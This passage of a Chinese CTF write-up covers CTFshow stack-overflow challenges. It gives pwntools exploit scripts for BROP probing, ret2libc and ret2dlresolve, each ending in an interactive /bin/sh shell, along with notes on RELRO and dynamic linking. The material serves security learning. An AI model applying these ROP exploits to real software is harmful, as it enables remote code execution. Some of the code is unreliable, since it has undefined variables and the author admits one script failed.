class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getBufferLength():</span><br><span class="line">	i = 1</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">		    p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">		    p.recvuntil(&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?\n&quot;)</span><br><span class="line">		    # 这里注意不要用sendline，sendline会多一个回车</span><br><span class="line">		    p.send(i*b&#x27;a&#x27;)</span><br><span class="line">		    data = p.recv()</span><br><span class="line">		    p.close()</span><br><span class="line">		    if b&quot;No passwd&quot; in data:</span><br><span class="line">		        i += 1</span><br><span class="line">		    else: </span><br><span class="line">		    	return i-1</span><br><span class="line">		except EOFError:</span><br><span class="line">		    p.close()</span><br><span class="line">		    return i-1</span><br><span class="line"> </span><br><span class="line">def getStopGadget(buf_length):</span><br><span class="line">	# 没有任何意义的initial_address，单纯是感觉写address比较膈应</span><br><span class="line">	initial_address = 0x400000</span><br><span class="line">	address = initial_address</span><br><span class="line">	while True:</span><br><span class="line">		print(hex(address))</span><br><span class="line">		try: </span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)            </span><br><span class="line">			p.recvuntil(&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?\n&quot;)</span><br><span class="line">			p.send(cyclic(buf_length) + p64(address))</span><br><span class="line">			data = p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			if b&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?&quot; in data:</span><br><span class="line">				return address</span><br><span class="line">			else:</span><br><span class="line">				p.close()</span><br><span class="line">				address += 1</span><br><span class="line">		except EOFError:</span><br><span class="line">			address += 1</span><br><span class="line">			p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getBropGadget(buf_length,stop_gadget):</span><br><span class="line">	brop_gadget = stop_gadget</span><br><span class="line">	while True:</span><br><span class="line">		sleep(1)</span><br><span class="line">		brop_gadget += 1</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(brop_gadget)</span><br><span class="line">		payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;find address: 0x%x&quot; % brop_gadget)</span><br><span class="line">			try: # check</span><br><span class="line">				payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">				payload += p64(brop_gadget)</span><br><span class="line">				payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)</span><br><span class="line">				p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">				p.recvline()</span><br><span class="line">				p.sendline(payload)</span><br><span class="line">				p.recvline()</span><br><span class="line">				p.close()</span><br><span class="line">				log.info(&quot;bad address: 0x%x&quot; % brop_gadget)</span><br><span class="line">			except:</span><br><span class="line">				p.close()</span><br><span class="line">				log.info(&quot;gadget address: 0x%x&quot; % brop_gadget)</span><br><span class="line">				return brop_address</span><br><span class="line">		except EOFError as e:</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % brop_gadget)</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">			brop_gadget -= 1</span><br><span class="line">             </span><br><span class="line">def getPutsAddr(buf_length,stop_gadget,brop_gadget):</span><br><span class="line">	pop_rdi_ret = brop_gadget + 9</span><br><span class="line">	puts_addr = stop_gadget</span><br><span class="line">	while True:</span><br><span class="line">		sleep(1)</span><br><span class="line">		puts_addr += 1</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(pop_rdi_ret)</span><br><span class="line">		payload += p64(0x400000)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			if p.recv().startswith(&quot;\x7fELF&quot;):</span><br><span class="line">				log.info(&quot;puts_addr: 0x%x&quot; % puts_addr)</span><br><span class="line">				p.close()</span><br><span class="line">				return puts_addr</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % puts_addr)</span><br><span class="line">			p.close()</span><br><span class="line">		except EOFError as e:</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % puts_addr)</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">			puts_addr -= 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">def DumpMemory(buf_length,stop_gadget,brop_gadget,puts_addr,start_addr,end_addr):</span><br><span class="line">	pop_rdi_addr = brop_gadget + 9</span><br><span class="line">	res = &quot;&quot;</span><br><span class="line">	while start_addr &lt; end_addr:</span><br><span class="line">		sleep(1)</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(pop_rdi_addr)</span><br><span class="line">		payload += p64(start_addr)</span><br><span class="line">		payload += p64(puts_plt)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			data = p.recv(timeout=0.1)</span><br><span class="line">			if data == &#x27;\n&#x27;:</span><br><span class="line">				data = b&#x27;\x00&#x27;</span><br><span class="line">			elif data[-1] == &#x27;\n&#x27;:</span><br><span class="line">				data = data[:-1]</span><br><span class="line">			log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr,(data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">			result += data</span><br><span class="line">			start_addr += len(data)</span><br><span class="line">			p.close()</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">	return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	buf_length = 72</span><br><span class="line">	stop_gadgets = 0x400728</span><br><span class="line">	brop_gadgets = 0x4007ba</span><br><span class="line">	pop_rdi_ret = 0x400843</span><br><span class="line">	puts_plt = 0x400550</span><br><span class="line">	puts_got = 0x602018</span><br><span class="line">	p.recvuntil(&#x27;Do you know who is daniu?\n&#x27;)</span><br><span class="line">	payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">	payload += p64(stop_gadgets)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	puts = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">	libc = LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class="line">	libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">	system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">	bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">	payload = b&#x27;a&#x27; * buf_length + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="pwn81"><a href="#pwn81" class="headerlink" title="pwn81"></a>pwn81</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828160635424.png" alt="image-20240828160635424"></p>
<p>开了nx,pie，没开canary的64bit程序</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828163344104.png" alt="image-20240828163344104"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828164902058.png" alt="image-20240828164902058"></p>
<p>printf输出system函数的地址，读取system的地址之后通过ret2libc应该就可以getshell，溢出点在ctfshow的read函数上，不过好像有点小啊，只有三个地址的位置</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828164729085.png" alt="image-20240828164729085"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28111&quot;)</span><br><span class="line">#libc = ELF(&quot;../libc-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x80 + 0x8</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Maybe it\&#x27;s simple,O.o\n&#x27;)</span><br><span class="line">system_addr = int(p.recvline(),16)</span><br><span class="line">print(hex(system_addr))</span><br><span class="line">libc = LibcSearcher(&quot;system&quot;,system_addr)</span><br><span class="line">base_addr = system_addr - libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = base_addr + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">print(hex(bin_sh_addr))</span><br><span class="line">pop_rdi = base_addr + 0x2164f</span><br><span class="line">ret = base_addr + 0x8aa</span><br><span class="line">payload = cyclic(offset) + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret)+ p64(system_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>emmm，没有原来的libc确实是找不到正确的gadget，至少思路确实是这样的，至于gadget就直接用官方wp的吧，除非自己去下个虚拟机。</p>
<p>写不出来啊，算了，不写了，等过几天把虚拟机下载下来再搞，烦捏。</p>
<h5 id="读取输出地址的方法"><a href="#读取输出地址的方法" class="headerlink" title="读取输出地址的方法"></a>读取输出地址的方法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果是直接以字符串输出的话，</span><br><span class="line">使用int(io.recvline(),16)读取</span><br><span class="line">如果是以字节输出的话</span><br><span class="line">使用u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))读取</span><br></pre></td></tr></table></figure>

<h4 id="pwn82"><a href="#pwn82" class="headerlink" title="pwn82"></a>pwn82</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828175443066.png" alt="image-20240828175443066"></p>
<p>开启了nx，no-relro，canary和pie都没有开</p>
<p>relro: no意味着可以对plt和got表进行修改，如果对got和plt的内容进行修改，那么在执行函数的时候就会链接到写入的恶意代码，从而getshell</p>
<p>那么这里就涉及到知识点：ret2dlresolve</p>
<p>参考ctfwiki的内容：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#no-relro">ret2dlresolve - CTF Wiki (ctf-wiki.org)</a></p>
<p>如果不太理解程序链接和_dl_runtime_resolve函数的话，可以先看这篇文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/unr4v31/p/15168342.html">深入理解-dl_runtime_resolve - unr4v31 - 博客园 (cnblogs.com)</a>，写得也好好，而且图片特别多，好喜欢</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829113417399.png" alt="image-20240829113417399"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240828230108152.png" alt="image-20240828230108152"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829114634692.png" alt="image-20240829114634692"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829134310531.png" alt="image-20240829134310531"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829134635076.png" alt="image-20240829134635076"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28111&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn82&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn82&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">#rop.raw(cyclic(offset))</span><br><span class="line">rop.raw(offset*&#x27;a&#x27;)</span><br><span class="line"></span><br><span class="line"># 从与ELF Dynamic Information相关的图中可以看到，0x08049804+4所在的位置是DT_STRTAB所在的位置，也就是.dynstr的起始地址，这里是在rop链中调用了read函数，改变0x08049808地址的内容，在下面的代码中send了0x080498E0，位于bss段，也就是说，此处的操作将.dynamic指向.dynstr的地址改为了指向.bss</span><br><span class="line">rop.read(0,0x08049804+4,4) </span><br><span class="line"></span><br><span class="line"># 获取elf中.dynstr中的数据，并存储到变量dynstr中，将dynstr变量中的read改为system，为执行恶意代码做准备</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data()</span><br><span class="line">dynstr = dynstr.replace(b&quot;read&quot;,b&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">#在.bss再写入一个新的.dynstr，并写入/bin/sh字符串，便于system的调用</span><br><span class="line">rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section</span><br><span class="line">rop.read(0,0x080498E0+0x100,len(&quot;/bin/sh\x00&quot;)) # read /bin/sh\x00</span><br><span class="line"></span><br><span class="line"># 跳转到read@plt的第二条指令执行，也就是直接push，而不经过.got表，因为如果got表已经有地址的话就不会使用_dl_runtime_resolve解析了，所以为了保证程序的稳定性，此处可以直接从第二条指令开始，保证_dl_runtime_resolve的执行</span><br><span class="line">rop.raw(0x08048376) </span><br><span class="line"></span><br><span class="line"># 0xdeadbeff占据了一个空位，没什么用，不写理论上也可以</span><br><span class="line">rop.raw(0xdeadbeef)</span><br><span class="line"># 调用完_dl_runtime_resolve函数之后，会直接调用到system函数，此处0x080498E0+0x100也就是/bin/sh作为system的参数被调用</span><br><span class="line">rop.raw(0x080498E0+0x100)</span><br><span class="line"># 显示rop链的信息 </span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line"># read读取0x100个字节，所以此处需要补全到0x100个字节</span><br><span class="line">assert(len(rop.chain())&lt;=256)</span><br><span class="line">rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(0x080498E0))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h5 id="dl-runtime-resolve函数知识补充1"><a href="#dl-runtime-resolve函数知识补充1" class="headerlink" title="_dl_runtime_resolve函数知识补充1"></a>_dl_runtime_resolve函数知识补充1</h5><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829103832990.png" alt="image-20240829103832990"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829105602876.png" alt="image-20240829105602876"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829110045640.png" alt="image-20240829110045640"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829110302209.png" alt="image-20240829110302209"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">逐条分析一下指令的跳转</span><br><span class="line">这是call printf函数的内部</span><br><span class="line">jmp 0x804a00c -&gt; 0x804a00c就是.got.plt表中跟printf相关的条目</span><br><span class="line">push 0 作为_dl_runtime_resolve的第二个参数</span><br><span class="line">jmp 0x80483a0 -&gt; 0x80483a0就是下面那一段</span><br><span class="line">push 0x804a004 作为_al_runtime_resolve的第一个参数，也就是.got.plt表的起始地址</span><br><span class="line">jmp 0x804a008 0x804a008中存放的就是_dl_runtime_resolve函数的起始地址。</span><br><span class="line"></span><br><span class="line">开始调用_dl_runtime_resolve函数，_dl_runtime_resolve中的_dl_fixup通过_dl_runtime_resolve(link_map_obj, reloc_index)中的link_map_obj和reloc_index参数解析出函数的真实地址并填充到got表中，下次调用函数时就会直接jmp到真实地址</span><br></pre></td></tr></table></figure>

<h5 id="reloc-index知识补充"><a href="#reloc-index知识补充" class="headerlink" title="reloc_index知识补充"></a>reloc_index知识补充</h5><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829112918310.png" alt="image-20240829112918310"></p>
<p>reloc_index可以通过对.ret.plt -&gt; .dynsym -&gt; .synstr的链接达成对函数的解析</p>
<h5 id="relro知识回顾"><a href="#relro知识回顾" class="headerlink" title="relro知识回顾"></a>relro知识回顾</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">在现代计算机安全中，`RELRO`（**RELocation Read-Only**）是一种防护机制，用于保护程序的内存免受一些常见的漏洞利用技术（例如缓冲区溢出）的攻击。`RELRO` 主要涉及的是将全局偏移表（GOT）和其他内存区域标记为只读，从而防止攻击者修改这些位置以劫持程序的控制流。</span><br><span class="line"></span><br><span class="line">RELRO的级别</span><br><span class="line">`RELRO` 有两个主要级别：`full` 和 `partial`。在某些情况下，你可能会看到 `no RELRO`，表示未启用该防护。</span><br><span class="line"></span><br><span class="line">1. relro:full（Full RELRO）</span><br><span class="line">   - 描述：`Full RELRO` 是最严格的保护级别。它不仅将全局偏移表（GOT）标记为只读，还会将动态链接器中其他易受攻击的部分标记为只读。</span><br><span class="line">   - 实现：</span><br><span class="line">     - 在程序加载时，所有需要重定位的地址（如 GOT 表项）都在程序开始执行之前被处理完毕。</span><br><span class="line">     - 之后，这些内存区域被标记为只读，这样即使程序中存在漏洞，攻击者也无法修改这些表项以劫持控制流。</span><br><span class="line">   - 优点：提供了很强的保护，防止了通过修改 GOT 表项进行攻击。</span><br><span class="line">   - 缺点：可能会导致程序启动时间略有增加，因为所有的重定位必须在程序开始执行之前完成。</span><br><span class="line"></span><br><span class="line">2. relro:partial（Partial RELRO）</span><br><span class="line">   - 描述：`Partial RELRO` 是一种较为宽松的保护形式。它只将部分表项（如 `.got.plt`）标记为只读，其他部分则保持可写。</span><br><span class="line">   - 实现：</span><br><span class="line">     - 在程序加载时，一部分重定位被处理，然后这些部分被标记为只读。</span><br><span class="line">     - 但是，某些延迟重定位（如 `.got.plt` 中的条目）仍然是可写的，这些条目在实际调用时才会被重定位。</span><br><span class="line">   - 优点：相较于 `Full RELRO`，`Partial RELRO` 对程序启动时间影响较小。</span><br><span class="line">   - 缺点：保护不如 `Full RELRO` 完整，仍有可能被利用进行攻击。</span><br><span class="line"></span><br><span class="line">3. relro:no（No RELRO）</span><br><span class="line">   - 描述：`No RELRO` 表示程序没有启用任何 RELRO 保护。</span><br><span class="line">   - 实现：程序加载时，所有重定位区域保持可写，攻击者可以通过修改这些区域来劫持程序的执行流。</span><br><span class="line">   - 优点：程序加载速度最快。</span><br><span class="line">   - 缺点：完全没有保护，易受各种内存修改攻击。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">- relro:full：提供最强保护，将 GOT 和其他内存区域标记为只读，但可能会稍微增加程序启动时间。</span><br><span class="line">- relro:partial：提供部分保护，仅标记部分区域为只读，启动时间影响较小。</span><br><span class="line">- relro:no：没有任何保护，易受攻击。</span><br></pre></td></tr></table></figure>

<h5 id="DT-STRTAB知识补充"><a href="#DT-STRTAB知识补充" class="headerlink" title="DT_STRTAB知识补充"></a>DT_STRTAB知识补充</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 文件格式中，`.dynamic` 段包含了动态链接器在运行时所需的信息。它存储了各种动态链接表项（`dynamic table entries`），这些表项定义了运行时动态链接的配置和行为。</span><br><span class="line"></span><br><span class="line">其中，`DT_STRTAB` 是 `.dynamic` 段中非常重要的一项，它指向一个字符串表（`string table`），通常包含符号名、库名等字符串信息。`DT_STRTAB` 的具体作用如下：</span><br><span class="line"></span><br><span class="line">1. 指向字符串表（String Table）：</span><br><span class="line">   `DT_STRTAB` 表项的值是一个指针，指向 ELF 文件中的一个字符串表（通常是 `.dynstr` 段）。这个字符串表包含所有在动态链接过程中可能用到的字符串。</span><br><span class="line"></span><br><span class="line">2. 关联符号表（Symbol Table）：</span><br><span class="line">   `DT_STRTAB` 通常与 `DT_SYMTAB`（符号表）关联。符号表中的每个符号都有一个 `st_name` 字段，这是一个相对于字符串表的偏移量，用来定位符号名的字符串。</span><br><span class="line"></span><br><span class="line">3. 动态链接时字符串查找：</span><br><span class="line">   当动态链接器解析符号时，它会通过符号表的 `st_name` 字段找到字符串表中的符号名。比如，当动态链接器需要查找函数名时，它会通过 `DT_SYMTAB` 找到对应的符号表项，然后使用 `DT_STRTAB` 指向的字符串表来获得符号名。</span><br><span class="line"></span><br><span class="line">4. 其他用途：</span><br><span class="line">   除了符号名，`DT_STRTAB` 指向的字符串表还可以包含其他动态链接器使用的字符串，比如共享库的名称（由 `DT_NEEDED` 指定）。</span><br><span class="line"></span><br><span class="line">动态链接过程中：</span><br><span class="line">1. 动态链接器通过 `DT_STRTAB` 找到字符串表的位置。</span><br><span class="line">2. 当需要解析符号时，它会通过符号表中的 `st_name` 字段找到字符串表中的符号名。</span><br><span class="line">3. 这个字符串名用于查找、解析符号，或者加载共享库。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line">`DT_STRTAB` 是动态链接过程中的一个关键元素，它提供了访问字符串表的入口，字符串表包含了动态链接所需的符号名等信息，是动态链接器解析符号、处理依赖的重要资源。</span><br></pre></td></tr></table></figure>

<h4 id="pwn83"><a href="#pwn83" class="headerlink" title="pwn83"></a>pwn83</h4><p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829145808399.png" alt="image-20240829145808399"></p>
<p>可以看到relro变为了partial</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829154727934.png" alt="image-20240829154727934"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240829154803443.png" alt="image-20240829154803443"></p>
<p>.dynamic没有write权限了，所以也无法修改</p>
<p>接下来其实基本上是复刻ctfwiki的内容（其实这道题是可以用其他方法写的，不过由于这些题就是为了学习ret2dlresolve而设定的，所以就不使用其他方法写了）</p>
<h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h5><p>使用栈迁移将栈迁移到.bss，然后执行write方法</p>
<p>结果输出字符串的话就是调用write方法成功了</p>
